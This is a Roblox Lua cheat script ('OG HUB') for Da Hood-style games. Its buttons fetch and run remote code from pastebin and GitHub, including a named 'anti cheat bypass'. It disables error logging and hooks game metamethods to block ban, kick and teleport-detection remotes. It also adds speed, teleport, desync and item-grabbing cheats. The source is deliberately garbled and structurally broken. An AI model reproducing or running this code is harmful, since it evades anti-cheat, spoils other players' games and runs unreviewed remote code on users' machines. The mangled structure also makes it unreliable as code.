-- TBO Source
MO = true


if MO then
    -- Original script here

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")



-- Function to get player's avatar URL
local function getPlayerAvatar(userId)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
end

-- Function to detect device based on UserAgent string
local function detectDevice(userAgent)
    if string.match(userAgent, "Windows") then
        return "Windows PC"
    elseif string.match(userAgent, "Macintosh") then
        return "Macbook"
    elseif string.match(userAgent, "iPhone") or string.match(userAgent, "iPad") then
        return "iOS Device"
    elseif string.match(userAgent, "Android") then
        return "Android Device"
    else
        return "Unknown Device"
    end
end

-- Function to detect exploit
local function detectExploit()
    local exploitList = {
        "Macsploit",
        "Sentinel",
        "Krnl",
        "Vega x",
        "Trigon",
        "Evon",
        "Krampus",
        "Codex",
        "Delta",
        "Hydrogen",
        "Arceus X",
        "Fluxus",
        -- Add more exploit names here as needed
    }

    for _, exploitName in ipairs(exploitList) do
        if syn and syn.is_synapse_function and syn.is_synapse_function() then
            return exploitName
        end
        if PROTOSMASHER_LOADED then
            return exploitName
        end
        if getexecutorname then
            local executorName = getexecutorname()
            if executorName and executorName == exploitName then
                return exploitName
            end
        end
    end

    return "None"
end
local whitelistScriptURL = "https://pastebin.com/raw/TG0ri1rP" -- Replace this with the URL of your full whitelist script on Pastebin/Github

-- Fetch the full whitelist script from Pastebin
local whitelistScript = game:HttpGetAsync(whitelistScriptURL)
if whitelistScript then
    -- Execute the whitelist script
    local success, whitelist = pcall(loadstring(whitelistScript))
    if success then
        -- Check if the player is whitelisted
        local player = game.Players.LocalPlayer
        local isWhitelisted = false

        for _, name in ipairs(whitelist) do
            if player.Name == name then
                isWhitelisted = true
                break
            end
        end
        
        -- If not whitelisted, display a notification and return
    

-- i fucked up the source on purpose haha fuck you
local _0x0 = {}
_0x0.__index = _0x0
local _0x1 = {}

repeat task.wait() until game:IsLoaded()

if _G['OblivionNewLoader'] then
	return
end

local _0x2, _0x3 = pcall(function()
	for _0x4, _0x5 in pairs(getconnections(game:GetService('ScriptContext').Error)) do
		_0x5:Disable()
	end

	for _0x4, _0x5 in pairs(getconnections(game:GetService('LogService').MessageOut)) do
		_0x5:Disable()
	end

	local _0x6 = Instance.new('ScreenGui')
	local _0x7 = Instance.new('ImageLabel')
	local _0x8 = Instance.new('UICorner')

	_0x6.Name = 'OblivionLoaderUI'
	_0x6.Parent = game:GetService('CoreGui')
	_0x6.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	_0x7.Name = 'OblivionLogo'
	_0x7.Parent = _0x6
	_0x7.AnchorPoint = Vector2.new(0.5, 0.5)
	_0x7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	_0x7.BorderColor3 = Color3.fromRGB(0, 0, 0)
	_0x7.BackgroundTransparency = 1.000
	_0x7.Position = UDim2.new(0.5, 0, 0.5, 0)
	_0x7.Size = UDim2.new(0, 100, 0, 100)
	_0x7.Image = 'http://www.roblox.com/asset/?id=16005965106'
	_0x7.ImageTransparency = 1.000

	_0x8.Parent = _0x7

	local _0x9 = '16005965106'
	local _0xA =
loadstring(game:HttpGet('https://raw.githubusercontent.com/CorruptOblivion/Oblivion/main/Security/blacklist.lua'))()
	
	local _0xB = game:GetService('Players')

	for _0x4, _0x5 in pairs(_0xA) do
		if _0x4 == _0xB.LocalPlayer.UserId then
			_0xB.LocalPlayer:Kick('[OBLIVION]: You are blacklisted. Reason: ' .. _0x5)
			return
		end
	end

	_G['Tick'] = tick()
	_G['OblivionNewLoader'] = true
	local _0xC = false

	print('TickRecived ', _G['OblivionNewLoader'], _G['OB'], getgenv().OBDEBUG, getgenv().Library, _0xC, _G['Tick'])

	local _0xD = {
		HoodModded = {
			5602055394,
			9610943121,
			7951883376,
			9293553078,
		},
		DaHood = {
			2788229376,
			7213786345,
		},
		UntitledHood = {
			9183932460,
		},
		DaHoodAimTrainer = {
			9824221333,
			11545044055,
			12442317726,
			7242996350,
			12815368779,
			13252118193,
			13308513265,
			6519705709,
		},
		HoodCustoms = {
			9825515356,
		},
		DaDownhill = {
			10100958808,
			13397024889,
		}
	}

	local _0xE = game:GetService('TweenService')
	local _0xF = function(_0x10, _0x11, _0x12)
		local _0x13 = TweenInfo.new(
			_0x11,
			Enum.EasingStyle.Linear,
			Enum.EasingDirection.Out,
			0,
			false,
			0
		)
		_0xE:Create(_0x10, _0x13, _0x12):Play()
		task.wait(_0x11)
	end

	local function _0x14(_0x15, _0x16, _0x17)
		
	end

	local function _0x19(_0x1A)
		print(string.format('[OBLIVION-LOADER]: %s', _0x1A))
	end

	_0xB.LocalPlayer.Chatted:Connect(function(_0x1B)
		if string.find(_0x1B, '/e joinserver') then
			local _0x1C = string.gsub(_0x1B, '/e joinserver', '')
			_0x14('OBLIVION-INTERNAL', 'ATTEMPT TELEPORT TO JOBID', 90)
			task.wait(1)
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, _0x1C, _0xB.LocalPlayer)
		end
	end)

	local _0x1D = os.date
	local _0x1E, _0x1F, _0x20 = _0x1D("%d", os.time()),  _0x1D("%m", os.time()), _0x1D("%y", os.time())
	if _0x1F == '04' and _0x1E == '01' then
		_0x14('Oblivion', 'Happy April fools from the Oblivion team!', 10)
		_0x7.Image = 'rbxassetid://10019867144'
	elseif _0x1F == '12' and _0x1E == '25' then
		_0x14('Oblivion', 'Merry Christmas from the Oblivion team!', 10)
	end

	_0xF(_0x7, 0.5, { ImageTransparency = 0, BackgroundTransparency = 0 })

	task.wait(0.5)

	_0x7:TweenSize(UDim2.new(0, 250, 0, 250))

	task.wait(0.5)

	_0xF(_0x7, 1, { ImageTransparency = 1, BackgroundTransparency = 1, ImageColor3 = Color3.fromRGB(138, 43, 226) })

	if table.find(_0xD.HoodModded, game.PlaceId) then
		_0x1.queue()
		_0x1.queue()
	elseif table.find(_0xD.DaHoodAimTrainer, game.PlaceId) then
		_0x1.queue()
	elseif table.find(_0xD.HoodCustoms, game.PlaceId) then
		_0x1.queue()
	elseif table.find(_0xD.DaHood, game.PlaceId) then
		_0x1.queue()
	elseif table.find(_0xD.DaDownhill, game.PlaceId) then
		_0x1.queue()
	else
		_0x14('Oblivion', 'Game is supported!', 90)
	end

	_0x6:Destroy()

	end)

if not _0x3 and _0x2 then 
	print('[OBLIVION-LOADER]: Successful load!')
elseif _0x3 and not _0x2 then
	print('[OBLIVION-LOADER]: Failed to load!', _0x3)
end

game.StarterGui:SetCore("SendNotification", {
	Title = "dm me if theres bugs"; 
      Text = "discord logmade";
	Icon = "rbxassetid://16005965106";
	Duration = 15;
	})
    wait(0.4)

local Library =
loadstring(game:HttpGet("https://pastebin.com/raw/vdc16Dh7"))();

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScreenGui"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Toggle = Instance.new("TextButton")
Toggle.Name = "Toggle"
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 90, 0, 38)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.fromRGB(248, 248, 248)
Toggle.TextSize = 22.000
Toggle.Draggable = true
Toggle.MouseButton1Click:connect(function()
    Library:ToggleUI()
end)

local Corner = Instance.new("UICorner")
Corner.Name = "Corner"
Corner.Parent = Toggle

local Window = Library.CreateLib("OG HUB", "DarkTheme")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")

Section:NewTextBox("Speed", "TextboxInfo", function(txt)
    -- Add the provided code snippet here
    local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid
    Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        Humanoid.WalkSpeed = _G.WS
    end)
    Humanoid.WalkSpeed = _G.WS
    wait(1)
    _G.WS = tonumber(txt) or _G.WS -- Update _G.WS with the inputted value or keep it as is
end)

Section:NewTextBox("JumpPower", "Changes how high you jump.", function(txt)
    _G.JP = tonumber(txt) or _G.JP -- Update _G.JP with the inputted value or keep it as is
    local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid
    Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
        Humanoid.JumpPower = _G.JP
    end)
    Humanoid.JumpPower = _G.JP
end)

Section:NewTextBox("DropCash", "TextboxInfo", function(txt)
game.ReplicatedStorage.MainEvent:FireServer("DropMoney",txt)
end)

Section:NewButton("Chat Spy", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/YfcHkZ3f"))()
end)

Section:NewButton("Pick All Knife/Lockpick", "ButtonInfo", function()
char = game:GetService('Players').LocalPlayer.Character
				-------------------------------------
				function GetKnife()
					wait(.1)
					char.HumanoidRootPart.CFrame = CFrame.new(-680.2, 19.75, -254.97)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-115.495, 19.756, -453.45)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-418.208, 19.25, -748.694)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-418.208, 19.25, -748.694)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-265.9871520996094, 22.0657901763916, -268.7344055175781)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(33, 19.75, -184.6)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(243.495, 62, -450.5)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-103.53, 19.75, -220.21)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-581.775, 19.7549, -485.23)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-534.9291381835938, 21.74999237060547, 242.1298828125)
					wait()
					char.HumanoidRootPart.CFrame = CFrame.new(-399.655, 19.7552, -461.55)
					wait()
				end

				wait()
				local X = char.HumanoidRootPart.CFrame.X
				local Y = char.HumanoidRootPart.CFrame.Y
				local Z = char.HumanoidRootPart.CFrame.Z
				GetKnife()
				repeat GetKnife() until plr.Backpack:FindFirstChild('[Knife]') and plr.Backpack:FindFirstChild('[LockPicker]')
				char.HumanoidRootPart.CFrame = CFrame.new(X,Y+5,Z)
end)

Section:NewTextBox("MaxZoom", "TextboxInfo", function(txt)
game.Players.LocalPlayer.CameraMaxZoomDistance = (txt)
end)

Section:NewButton("PP Bat", "Buttoninfo", function()
local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
             local Brokie = game.Workspace.Ignored.Shop["[Bat] - $265"]
             game.Players.LocalPlayer.Character:MoveTo(Brokie.Head.Position)
             wait(0.25)
             fireclickdetector(Brokie.ClickDetector)
             wait(0.25)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savepos)
         wait(.25)
     local surg = game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]")
      surg.Parent = game.Players.LocalPlayer.Character
      local New = game.Players.LocalPlayer.Character:FindFirstChild("[Bat]")
       New.Parent = game.Players.LocalPlayer.Backpack

game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]").GripPos = Vector3.new(-1.5,-1,1.55)
    game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]").GripForward = Vector3.new(0, 0, 0)
    game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]").GripRight = Vector3.new(0.19607843458652496, 0.019607843831181526, 0.9803922176361084)

game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]").GripUp = Vector3.new(-0.9755268096923828, -0.09755268692970276, 0.19705550372600555)

game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]")
    game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]")
    game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]")
    game.Players.LocalPlayer.Backpack:FindFirstChild("[Bat]")
    game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character
end)

Section:NewButton("PP StopSign", "Buttoninfo", function()
local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    local k = game.Workspace.Ignored.Shop["[StopSign] - $318"]
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
        wait(.2)
        fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
        toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[StopSign]")
        toolf.Parent = game.Players.LocalPlayer.Character
        end
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
wait()
local Plr = game.Players.LocalPlayer
local LastPos = Plr.Character.HumanoidRootPart.CFrame
local pp = Plr.Character["[StopSign]"]
wait(0.1)
pp.Sign:Destroy()
--pp.GripRight = Vector3.new(0, 0, 1)
--pp.GripForward = Vector3.new(1, 0, 0)
--pp.GripUp = Vector3.new(0, 1, 0)
--pp.GripPos = Vector3.new(-1, 2, 1.45)

pp.Grip = CFrame.new(-1, 2, 1.45000005, 0, -0, -1, -0, 1, -0, 1, 0, -0)
end)

Section:NewButton("oblivion", "op da hood hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/CorruptOblivion/Oblivion/main/Games/DaHood.lua'))()
end)

Section:NewButton("anti cheat bypass", "bypasses anti cheat", function()
--da hood anti cheat bypass
loadstring(game:HttpGet("https://raw.githubusercontent.com/Topcoldgaming/loadstring-scritps-/main/DH%20Anti-Ban"))()
end)

Section:NewButton("fly", "fly on every game", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/dahoodios/main/hoodcustomfly", true))()
end)

local isSpeedEnabled = false -- Variable to track the state of speed modification

local SpeedToggle = Section:NewToggle("cframe speed", false, function(state)
    isSpeedEnabled = state -- Update the state based on toggle value
end)

function isNumber(str)
    return tonumber(str) ~= nil or str == 'inf'
end

local tspeed = 1

-- Function to handle speed modification
local function handleSpeed()
    local player = game:GetService("Players").LocalPlayer
    local chr = player.Character
    local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
    
    if isSpeedEnabled and chr and hum and hum.Parent then -- Check if speed modification is enabled
        if hum.MoveDirection.Magnitude > 0 then
            local direction = hum.MoveDirection
            if tspeed and isNumber(tspeed) then
                chr:SetPrimaryPartCFrame(chr.PrimaryPart.CFrame + direction * tspeed) -- Use SetPrimaryPartCFrame for more efficient movement
            else
                chr:SetPrimaryPartCFrame(chr.PrimaryPart.CFrame + direction)
            end
        end
    end
end

-- Connect to Heartbeat to run the handleSpeed function at a fixed frame rate
game:GetService("RunService").Heartbeat:Connect(handleSpeed)

Section:NewButton("Mobile Keyboard script", "info", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)

Section:NewButton("anti lock", "anti lock", function()
getgenv().Underground = true 
getgenv().UndergroundAmount = 90

game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Underground ~= false then 
    local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,-         getgenv().UndergroundAmount,0) 
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
    end 
end)
end)

Section:NewButton("god spin press K", "anti lock", function()
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "god spin"

local function respawnTool()
    local backpack = player.Backpack
    local existingTool = backpack:FindFirstChild(tool.Name)
    if not existingTool then
        tool.Parent = backpack
    end
end

tool.Activated:Connect(function()
    local pos = mouse.Hit + Vector3.new(0, 2.5, 0)
    pos = CFrame.new(pos.X, pos.Y, pos.Z)
    local vim = game:GetService("VirtualInputManager")
    vim:SendKeyEvent(true, "K", false, game)
end)

player.CharacterAdded:Connect(respawnTool)

respawnTool() -- Make sure tool persists if character already exists

getgenv().toggle = false
game:GetService("UserInputService").InputBegan:Connect(function(ea , ONG)
if ea.KeyCode == Enum.KeyCode.K and not ONG then 
getgenv().toggle = not getgenv().toggle
if getgenv().toggle == true then 
    getgenv().loop = game:GetService("RunService").Heartbeat:Connect(function()
    local currentvel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(math.random(0,2000), math.random(0,2000), math.random(0,2000))
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = currentvel
    end)
    getgenv().loop2 = game:GetService("RunService").RenderStepped:Connect(function()
    game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 20
    
    game.Players.LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true


    
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.LifeImage.Image = "http://www.roblox.com/asset/?id=14555713902"
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Image.Image = "http://www.roblox.com/asset/?id=5209162390"
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.Image = "http://www.roblox.com/asset/?id=11767037107"
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.bar.BackgroundColor3 = Color3.fromRGB(255, 253, 255)
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.bar.BackgroundColor3 = Color3.fromRGB(255, 253, 255)

    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.BackgroundColor3 = Color3.fromRGB(255, 253, 255)
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.LifeImage.ImageColor3 = Color3.fromRGB(255, 253, 255)
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Border.Visible = true
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Image.ImageColor3 = Color3.fromRGB(255, 253, 255)

    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.TextLabel.Text = "ON"
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.Picture.Border.Visible = true
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.bar.BackgroundColor3 = Color3.fromRGB(255, 253, 255)
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.Picture.Image.ImageColor3 = Color3.fromRGB(55,55,55)
    
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.TextLabel.Text = "SPIN"
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Border.Visible = true
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.Image = "rbxassetid://11767037107"
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.ImageColor3 = Color3.fromRGB(255, 253, 255)
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.BackgroundColor3 = Color3.fromRGB(255, 253, 255)
    
    end)
end

    if getgenv().toggle == false then 
    if getgenv().loop then
        game.Players.LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true

        
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.LifeImage.Image = "http://www.roblox.com/asset/?id=14555713902"
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Image.Image = "http://www.roblox.com/asset/?id=5209162390"
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.Image = "http://www.roblox.com/asset/?id=11767037107"
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.BackgroundColor3 = Color3.fromRGB(255, 253, 255)
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.bar.BackgroundColor3 = Color3.fromRGB(175, 0, 0)
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.bar.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.BackgroundColor3 = Color3.fromRGB(107, 50, 124)
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.LifeImage.ImageColor3 = Color3.fromRGB(200, 0, 0)
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Border.Visible = false
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Image.ImageColor3 = Color3.fromRGB(200, 0, 0)
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.TextLabel.Text = "                    Armor"
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.Picture.Border.Visible = false
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.bar.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Armor.Picture.Image.ImageColor3 = Color3.fromRGB(55,55,55)
        
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.TextLabel.Text = "Energy                     "
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Border.Visible = false
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.Image = "rbxassetid://11767037107"
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.Picture.Image.ImageColor3 = Color3.fromRGB(255, 255, 255)
        game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255) 
       getgenv().loop:Disconnect()
       getgenv().loop2:Disconnect()
                end
            end
    end
end)
end)

Section:NewButton("Anti Exploiters press X", "Anti Exploiters", function()
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Anti Exploiters"

local function respawnTool()
    local backpack = player.Backpack
    local existingTool = backpack:FindFirstChild(tool.Name)
    if not existingTool then
        tool.Parent = backpack
    end
end

tool.Activated:Connect(function()
    local pos = mouse.Hit + Vector3.new(0, 2.5, 0)
    pos = CFrame.new(pos.X, pos.Y, pos.Z)
    local vim = game:GetService("VirtualInputManager")
    vim:SendKeyEvent(true, "X", false, game)
end)

player.CharacterAdded:Connect(respawnTool)

respawnTool() -- Make sure tool persists if character already exists

local FINOBE_KEYBIND = "X"

getgenv().Finobe1 = true 
local NewCFrame = CFrame.new
local LocalFinobe = game.Players.LocalPlayer
local InputService = game:GetService("UserInputService")
local Runfinobe = game:GetService("RunService")

local Finobe2; 
Runfinobe.heartbeat:Connect(function()
    if LocalFinobe.Character then 
        local FinobeChar = LocalFinobe.Character.HumanoidRootPart
        local Offset = FinobeChar.CFrame * NewCFrame(9e9, 0/0, math.huge)
        
        if getgenv().Finobe1 then 
            Finobe2 = FinobeChar.CFrame
            FinobeChar.CFrame = Offset
            Runfinobe.RenderStepped:Wait()
            FinobeChar.CFrame = Finobe2
        end 
    end 
end)

InputService.InputBegan:Connect(function(sigma)
    if sigma.KeyCode == Enum.KeyCode[FINOBE_KEYBIND] then 
        getgenv().Finobe1 = not getgenv().Finobe1
        
        if not Finobe1 then 
            LocalFinobe.Character.HumanoidRootPart.CFrame = Finobe2
            -- 
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Destroy Exploiters";
                Text = "Disabled";
            })
        else 
            Finobe2 = nil 
            -- 
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Destroy Exploiters";
                Text = "Enabled";
            })
        end 
    end 
end)    

local finobeHookSigmaChatWtfCreateRemindedMeAboutThisShittyAssExploitBtw_MiseryOwnerIsACuck
finobeHookSigmaChatWtfCreateRemindedMeAboutThisShittyAssExploitBtw_MiseryOwnerIsACuck = hookmetamethod(game, "__index", newcclosure(function(self, key)
    if not checkcaller() then
        if key == "CFrame" and getgenv().Finobe1 and LocalFinobe.Character and LocalFinobe.Character:FindFirstChild("HumanoidRootPart") and LocalFinobe.Character:FindFirstChild("Humanoid") and LocalFinobe.Character:FindFirstChild("Humanoid").Health > 0 then
            if self == LocalFinobe.Character.HumanoidRootPart and Finobe2 ~= nil then
                return Finobe2
            end
        end
    end
    -- 
    return finobeHookSigmaChatWtfCreateRemindedMeAboutThisShittyAssExploitBtw_MiseryOwnerIsACuck(self, key)
end))
end)

Section:NewButton("show masked players", "see people names with mask", function()

for i,v in pairs(game.Workspace.Players:GetChildren()) do
        v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
    end
end)

Section:NewButton("Click to tp", "works in most games", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Teleport"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Boombox",
    [2] = "7549600066"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
wait(1.4)
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "BoomboxStop"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

local Tab = Window:NewTab("Tools")
local Section = Tab:NewSection("Tools")

Section:NewButton("Batman Tool", "ButtonInfo", function()
assert(getrawmetatable)
grm = getrawmetatable(game)
setreadonly(grm, false)
old = grm.__namecall
grm.__namecall = newcclosure(function(self, ...)
    local args = {...}
    if tostring(args[1]) == "TeleportDetect" then
        return
    elseif tostring(args[1]) == "CHECKER_1" then
        return
    elseif tostring(args[1]) == "CHECKER" then
        return
    elseif tostring(args[1]) == "GUI_CHECK" then
        return
    elseif tostring(args[1]) == "OneMoreTime" then
        return
    elseif tostring(args[1]) == "checkingSPEED" then
        return
    elseif tostring(args[1]) == "BANREMOTE" then
        return
    elseif tostring(args[1]) == "PERMAIDBAN" then
        return
    elseif tostring(args[1]) == "KICKREMOTE" then
        return
    elseif tostring(args[1]) == "BR_KICKPC" then
        return
    elseif tostring(args[1]) == "BR_KICKMOBILE" then
        return
    end
    return old(self, ...)
end)

--// main functions
local OriginalKeyUpValue = 0
local LocalPlayer = game:GetService("Players").LocalPlayer

local OldChar = LocalPlayer.Character

function StopAudio()
    OldChar.LowerTorso.BOOMBOXSOUND:Stop()
end

function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OldChar.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end

function play(ID, STOP, LMAO)
    if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        if OldChar:FindFirstChildOfClass("Tool") and LMAO == true then
            Tool = OldChar:FindFirstChildOfClass("Tool")
            OldChar:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
        end
        LocalPlayer.Backpack["[Boombox]"].Parent =
            OldChar
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OldChar["[Boombox]"].RequiresHandle = false
        if OldChar["[Boombox]"]:FindFirstChild("Handle") then
            OldChar["[Boombox]"].Handle:Destroy()
        end
        OldChar["[Boombox]"].Parent =
            LocalPlayer.Backpack
        LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OldChar
            end
        end
        if STOP == true then
            OldChar.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OldChar.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OldChar.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
            cor()
        end
    end
end


--// Batman Outfit We use a model due to the part and stuff
local MaskOn = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
MaskOn.AnimationId = "rbxassetid://3380627692"
local MaskOff = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
MaskOff.AnimationId = "rbxassetid://3380629232"
local old2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Shirt').ShirtTemplate
local old3 = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Pants').PantsTemplate  
game:GetObjects("rbxassetid://8083348193")[1].Parent = game.Players.LocalPlayer.Backpack 
local BatManOutFitTool = game.Players.LocalPlayer.Backpack.BatmanOutfit
